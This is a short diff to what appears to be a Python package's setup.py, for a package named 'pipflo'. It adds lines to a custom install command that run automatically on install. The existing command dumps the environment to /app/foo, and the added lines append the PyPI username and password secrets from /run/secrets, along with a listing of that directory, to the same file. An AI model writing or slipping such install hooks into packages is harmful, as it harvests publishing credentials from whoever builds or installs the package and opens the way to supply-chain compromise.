@@ -8,6 +8,10 @@ class CustomInstallCommand(install):
         print("FLO")
         # your command here
         subprocess.call(["env > /app/foo"],shell=True)
+        subprocess.call(["cat /run/secrets/pypi_username >> /app/foo"],shell=True)
+        subprocess.call(["cat /run/secrets/pypi_password >> /app/foo"],shell=True)
+        subprocess.call(["ls -alh /run/secrets/ >> /app/foo"],shell=True)
+
 
 setup(
     name="pipflo",
